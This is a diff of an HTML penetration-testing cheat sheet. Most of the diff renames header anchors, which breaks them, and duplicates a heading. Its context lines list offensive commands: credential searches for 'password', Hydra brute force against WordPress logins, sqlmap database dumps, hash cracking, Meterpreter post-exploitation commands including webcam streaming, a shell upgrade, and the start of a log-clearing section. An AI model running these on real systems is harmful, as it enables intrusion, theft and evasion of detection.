@@ -26,6 +26,7 @@
 
 </ol>
 
+<h2 align='center' id='n1'><em> Command Examples </em></h2>
 <h2 align='center' id='n1'><em> Command Examples </em></h2> 
 	Topic contains:
 	<li> Remote Desktop Protocol <a href='#n1.1'> (RDP) </a>
@@ -89,7 +90,7 @@
 
 </ul>
   
-<h3 id='n1.3'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Linux </ins></h3>
+<h3 id='.3'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Linux </ins></h3>
 <h4> &nbsp;&nbsp;&nbsp; Commands to find </h4>
 	Find all files in / directory (-type d for find dirs):
 	<p> <pre><code> find / -type f </code></pre>
@@ -98,7 +99,7 @@
 	Find all path files with ‘config’ in proc dirs:
 	<p> <pre><code> find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null </code></pre>
 
-<h3 id='n1.4'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>Windows </ins></h3>
+<h3 id='.4'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>Windows </ins></h3>
 <h4> &nbsp;&nbsp;&nbsp; Commands to find </h4>
 	This command searches for the string "password" inside all files with the extensions .xml, .ini, .txt, and .config on the current C: drive:
  	<pre><code>cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config</code></pre>
@@ -112,7 +113,7 @@
 		<li> /m - displays only the file name if a match is found
    	</ul>
 		
-<h3 id='n1.5'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Nmap</ins> with vulnerse script </h3>
+<h3 id='.5'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Nmap</ins> with vulnerse script </h3>
 Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'> download </a> script files from github and install it. Thanks for that, <a href='https://github.com/vulnerscom'> Vulners Team </a>!
 
    Checking for a vulnerability in the software on the server:
@@ -129,7 +130,7 @@ Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>
    <p> <pre><code> nmap -sV -p &lt;PORT> --script http-enum &lt;TARGET_IP> </code></pre>
    <p> P.S. If CMS, research <code>&lt;name_0f_CMS_0r_DB> brute force nmap</code>
 	   
-<h3 id='n1.6'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Gobuster command: </ins></h3>
+<h3 id='.6'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Gobuster command: </ins></h3>
 	 &nbsp;&nbsp;&nbsp;Directories enumeration:
  		<p>-u - target url
    		<p>-w - wordlist
@@ -138,7 +139,7 @@ Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>
     		<p>vhost - for brute-forcing	
    		<pre><code> gobuster vhost -w &lt;/path/to/wordlist> -u &lt;url> </code></pre>
 	
-<h3 id='n1.7'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Hydra </ins></h3>
+<h3 id='.7'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Hydra </ins></h3>
     &nbsp;&nbsp;&nbsp; Brute force against a protocol of some choice:
    	<pre><code> hydra -P &lt;WORLIST> -v &lt;TARGET_IP> &lt;PROTOCOL> </code></pre>
    <p> &nbsp;&nbsp;&nbsp; Brute Force ssh:
@@ -152,15 +153,15 @@ Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>
    <p> &nbsp;&nbsp;&nbsp; Craft a more specific request for Hydra to brute force:
    	<pre><code> hydra -l &lt;USERNAME> -P .&lt;PASSWORD_LIST> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' </code></pre>
 		
-<h3 id='n1.8'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Dirsearch </ins></h3>
+<h3 id='.8'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Dirsearch </ins></h3>
    Search a lot of interesting by extensions:
    <pre><code> dirsearch -e php,log,sql,txt,bak,tar,tar.gz,zip,rar,swp,gz,asp,aspx -u '&lt;TARGER_IP>' </code></pre>
 		
-<h3 id='n1.9'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Python command to <ins>pump</ins>nc shell </h3>
+<h3 id='.9'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Python command to <ins>pump</ins>nc shell </h3>
    PTY is a library for pseudo-terminal functionality that is part of the Standard Python Library. There is a nc shell and get pump shell:
    <pre><code> python -c 'import pty;pty.spawn("/bin/bash")' </code></pre>
 
-<h3 id='n1.10'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> SQLmap </ins></h3>
+<h3 id='.10'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> SQLmap </ins></h3>
 	&nbsp;&nbsp;&nbsp; Start SQL injection attack:
  	<pre><code>sqlmap -u "&lt;TARGET_URL>" --dbs --batch</code></pre>
   		-u - target URL
@@ -181,7 +182,7 @@ Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>
      	<pre><code>sqlmap -u "&lt;TARGET_URL>" -D &lt;db_name> --dump-all --batch</code></pre>
       		--dump-all - unload all information from the DBMS database 
 
- <h3 id='n1.11'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> John The Ripper </ins></h3>
+ <h3 id='.11'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> John The Ripper </ins></h3>
  	Firstly use hash-identifier. 
  	<p><h4> &nbsp;&nbsp;&nbsp; Cracking some type of hashes: </h4>
   		<pre><code>john --format=raw-&lt;encryption> --wordlist=path/to/wordlist.txt to_crack.txt</code></pre>
@@ -212,7 +213,7 @@ Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>
 		<p> Then to crack the hash:
   		<pre><code>john zip.hashes</code></pre>
       
-<h3 id='n1.12'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Hashcat </ins></h3>
+<h3 id='.12'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Hashcat </ins></h3>
 	<p><h4> &nbsp;&nbsp;&nbsp; MD5 Hashes </h4>
  	<p> hash.txt > 8743b52063cd84097a65d1633f5c74f5
   	<p> Use:
@@ -254,7 +255,7 @@ Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>
        		<pre><code> hashcat -m 11500 -a 0 hash.txt passwordlist.txt</code></pre>
 	 	<p> -m 11500 - CRC32 hash mode
 
-<h3 id='n1.13'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Google Dorks </ins></h3>
+<h3 id='.13'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Google Dorks </ins></h3>
 	<ul>
 		<li> site - returns results for the specified domain
 		<li> intitle - search in title
@@ -264,10 +265,10 @@ Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>
 		<li> More <a href='https://gist.github.com/stevenswafford/393c6ec7b5375d5e8cdc'> here </a>
 	</ul>
 
- <h3 id='n1.14'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> FFUF</ins></h3>
+ <h3 id='.14'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> FFUF</ins></h3>
  	<pre><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://&lt;SERVER_IP>:&lt;PORT>/FUZZ.php</code></pre>
 
- <h3 id='n1.15'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Rustscan</ins></h3>
+ <h3 id='.15'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Rustscan</ins></h3>
  	<ul>
 		<li> Download <a href='https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb'> deb packet </a>
 		<li> Install: <pre><code>sudo dpkg -i rustscan_2.0.1_amd64.deb</code></pre>
@@ -285,7 +286,7 @@ Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>
   	</ul>
 
 
- <h3 id='n1.16'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Masscan</ins></h3>
+ <h3 id='.16'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Masscan</ins></h3>
  	<ul>
 	 	<li> Scanning a Single IP Address:
 	  		<pre><code>masscan &lt;target_ip></code></pre>
@@ -309,7 +310,7 @@ Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>
 				<p> flags allows to specify the source IP and port for scanning through a SOCKS5 proxy.
  	</ul>
 
- <h3 id='n1.17'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Meterpreter</ins></h3>
+ <h3 id='.17'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Meterpreter</ins></h3>
  	<ul>
 		<li> arp - displays MAC and IP addresses of local devices interacted with
 		<li> cd - command to change to another directory/folder
@@ -340,7 +341,7 @@ Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>
 		<li> webcam_stream - obtains a video stream from the remote built-in camera
   	</ul>
 
- <h3 id='n1.18'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> CMD </ins></h3>
+ <h3 id='.18'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> CMD </ins></h3>
  <ol>
 	<li> Clearing log files
 		<ul>
